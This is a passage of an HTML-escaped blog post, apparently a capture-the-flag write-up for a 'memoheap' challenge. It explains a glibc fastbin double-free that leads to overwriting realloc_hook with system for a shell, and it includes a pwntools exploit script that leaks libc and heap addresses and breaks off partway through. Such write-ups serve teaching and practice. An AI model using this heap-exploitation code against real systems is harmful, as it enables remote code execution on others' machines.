+&lt;p&gt;&lt;img src=&quot;/assets/img/memoheap/heap-fastbin.png&quot; alt=&quot;heap-fastbin&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;So we can now allocate a chunk that starts at address – &lt;code class=&quot;highlighter-rouge&quot;&gt;0x55d93bc1d0&lt;/code&gt;. The first 8 bytes are prev_size, the next 8 are the size and then the area for chunk data. So we have write access starting from &lt;code class=&quot;highlighter-rouge&quot;&gt;0x55d93bc1e0&lt;/code&gt; for the next 24 bytes. Thus we can overwrite the next pointer (at address &lt;code class=&quot;highlighter-rouge&quot;&gt;0x55d93bc1f0&lt;/code&gt;) of the blue fastbin. We corrupt it with the address of the location just before malloc_hook (the one with value 0x7f). Once we have this done, we just have to create 2 memos of size 96 (this make’s the actual chunk size as 0x70). So malloc handles this request by allocating chunks from the fastbin of size=0x70. The second chunk that it allocates will be above malloc_hook.&lt;/p&gt;
+
+&lt;p&gt;Okay so now for the double free vulnerability. Create a memo (say memo ‘A’) of size zero and another (say memo ‘B’) of any random size. Now edit memo ‘A’. This will result in the memodata of ‘A’ being freed. Now we free memo ‘B’. This prevent’s the binary from aborting with a “double free corruption” message. After this delete memo ‘A’. Here’s an overview of what happen’s –&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;create(0) – memo A, memodata size = 0
+create(200) – memo B, memodata size = 200
+edit(A) – fastbin–&amp;gt;memodata(A)
+delete(B) – fastbin–&amp;gt;B–&amp;gt;memodata(A)
+delete(A) – fastbin–&amp;gt;A–&amp;gt;memodata(A)–&amp;gt;B–&amp;gt;memodata(A)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;So if we now create a memo of size 0x18, the memodata(A) will be the memodata for this chunk as well. We overwrite the first 8 bytes with the address of the location where we want a chunk (the address above the chunk with size=0x70). If we again create a memo of size (say) 200 (we need a size outside the 0x20 fastbin), the ‘B’ chunk is taken from the fastbin. Now fastbin contains on the memodata(A) chunk. So if we create a memo of size 0x18 then the memodata chunk will be the target location where we want to write.&lt;/p&gt;
+
+&lt;p&gt;So compiling this all together here is a brief summary –&lt;/p&gt;
+
+&lt;p&gt;Use double-free vulnerability to allocate a chunk that overlap’s with a free chunk of size 0x70. We then edit the next pointer of the fastbin with our target location above malloc_hook.
+Allocate two chunks of size 0x70 to get write access in the region around malloc_hook. With the data of the second chunk we can overwrite malloc_hook.
+Now to decide what to overwrite – malloc_hook or realloc_hook. realloc_hook takes a pointer for an argument. So this is ideal to be overwritten by system. Thus overwrite realloc_hook with system and edit a memo that has its data as ‘/bin/sh’. The edit function’s realloc(ptr,size) is now transalated as system(pointer_to_binsh,size) which gives a shell :).&lt;/p&gt;
+
+&lt;p&gt;Here’s my exploit script for the same –&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+  &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
+
+  &lt;span class=&quot;n&quot;&gt;HOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'memoheap.acebear.site'&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;PORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3003&lt;/span&gt;
+
+  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+     &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HOST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PORT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+     &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'./memo_heap'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;env&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;LD_PRELOAD&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;./memoheap_libc.so.6&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;
+
+  &lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ELF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;./memoheap_libc.so.6&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;menu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;no&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+     &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendlineafter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Your choice: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;no&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+
+  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;create&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+     &lt;span class=&quot;n&quot;&gt;menu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+     &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendlineafter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;What is size of memo you want to create? &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+     &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+         &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendlineafter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Name of memo: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;edit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+     &lt;span class=&quot;n&quot;&gt;menu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+     &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendlineafter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Index of memo you want to edit: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+     &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+         &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendlineafter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;New name of memo: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;show&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+     &lt;span class=&quot;n&quot;&gt;menu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+     &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendlineafter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Index of memo you want to show: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+     &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Name: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;delete&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+     &lt;span class=&quot;n&quot;&gt;menu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+     &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendlineafter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Index of memo you want to delete: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+
+  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;getleak&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
+     &lt;span class=&quot;n&quot;&gt;create&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;AAAAAAAA&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#0&lt;/span&gt;
+     &lt;span class=&quot;n&quot;&gt;create&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;BBBBBBBB&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#1&lt;/span&gt;
+     &lt;span class=&quot;n&quot;&gt;delete&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+     &lt;span class=&quot;n&quot;&gt;create&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;   &lt;span class=&quot;c&quot;&gt;#0&lt;/span&gt;
+     &lt;span class=&quot;n&quot;&gt;show&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+     &lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;u64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ljust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x3c4c38&lt;/span&gt;
+     &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;libc @ &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+     &lt;span class=&quot;n&quot;&gt;delete&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+     &lt;span class=&quot;n&quot;&gt;delete&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+     &lt;span class=&quot;n&quot;&gt;create&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;   &lt;span class=&quot;c&quot;&gt;#0&lt;/span&gt;
+     &lt;span class=&quot;n&quot;&gt;show&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+     &lt;span class=&quot;n&quot;&gt;heap&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;u64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ljust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xf0&lt;/span&gt;
+     &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;heap @ &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;heap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+     &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;heap&lt;/span&gt;
+
+  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;exploit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;heap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+     &lt;span class=&quot;n&quot;&gt;create&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;150&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/sh&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# 1&lt;/span&gt;
+     &lt;span class=&quot;n&quot;&gt;create&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# 2&lt;/span&gt;
+     &lt;span class=&quot;n&quot;&gt;create&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;EEEEEEEE&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# 3&lt;/span&gt;
+     &lt;span class=&quot;n&quot;&gt;delete&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+     &lt;span class=&quot;n&quot;&gt;create&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;70&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;48&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# 3&lt;/span&gt;
+     &lt;span class=&quot;n&quot;&gt;edit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+     &lt;span class=&quot;n&quot;&gt;delete&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+     &lt;span class=&quot;n&quot;&gt;delete&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+     &lt;span class=&quot;n&quot;&gt;create&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;heap&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1d0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#2 #overwrite next ptr of fastbin 0x20&lt;/span&gt;
+     &lt;span class=&quot;n&quot;&gt;create&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;96&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'w'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#3&lt;/span&gt;
+     &lt;span class=&quot;n&quot;&gt;delete&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+     &lt;span class=&quot;n&quot;&gt;create&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Q&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;    &lt;span class=&quot;c&quot;&gt;#3&lt;/span&gt;
